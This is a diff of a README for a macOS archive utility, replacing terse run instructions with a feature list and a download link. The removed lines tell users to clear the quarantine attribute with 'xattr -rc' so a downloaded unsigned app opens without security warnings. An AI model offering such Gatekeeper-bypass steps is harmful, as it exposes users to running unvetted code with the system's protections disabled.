@@ -1,19 +1,49 @@
-Download the desktop application from here (only compatible with MacOS): [ArchiveManager.zip](https://github.com/user-attachments/files/20624900/ArchiveManager.zip)
+# 📦 Archive Manager (macOS Desktop App)
 
-## How to Run ArchiveManager on Your Mac
+A sleek and lightweight macOS desktop application for effortlessly creating and extracting ZIP archives — built with **C++** and **wxWidgets**.
 
-1. Open the **Terminal** app.  
-2. Navigate to the folder where you downloaded the zip file, for example:  
-   `cd ~/Documents`  
-3. Unzip the file by running:  
-   `unzip ArchiveManager.zip`  
-   When prompted with:  
-   `replace __MACOSX/._ArchiveManager.app? [y]es, [n]o, [A]ll, [N]one, [r]ename:`  
-   type `A` and press Enter to replace all files.  
-4. Remove macOS security quarantine flag by running:  
-   `xattr -rc ArchiveManager.app`  
-5. Finally, open the app by running:  
-   `open ArchiveManager.app`  
+---
 
-The app should launch without security warnings.
+## 🧩 Features
 
+- 🗜️ **Create Archive**  
+  Select multiple files or folders and compress them into a single `.zip` file at your desired location.
+
+- 📂 **Extract Archive**  
+  Unzip files instantly — no nested folders, just direct access to the actual contents.
+
+- 💡 **Batch Extraction**  
+  Extract **multiple ZIP files at once** with a single click.
+
+> Designed with simplicity and speed in mind, **Archive Manager** keeps archiving clean and frustration-free.
+
+---
+
+## 🖥️ User Interface Preview
+
+![User Interface Screenshot](your-image-link-here)  
+<!-- Replace 'your-image-link-here' with the actual image link once uploaded -->
+
+---
+
+## ⬇️ Download
+
+> ⚠️ This app requires local compilation and is **only compatible with macOS** due to licensing limitations.
+
+Download the app to view the user interface:  
+🔗 [ArchiveManager.zip](https://github.com/user-attachments/files/20624900/ArchiveManager.zip)
+
+---
+
+## 🚀 How to Run Archive Manager on macOS
+
+1. Open **Terminal**.
+2. Navigate to your download location:
+   ```bash
+   cd ~/Documents
+3. Unzip the Archive
+   ```bash
+   unzip ArchiveManager.zip
+4. Launch the application
+   ```bash
+   open ArchiveManager.app
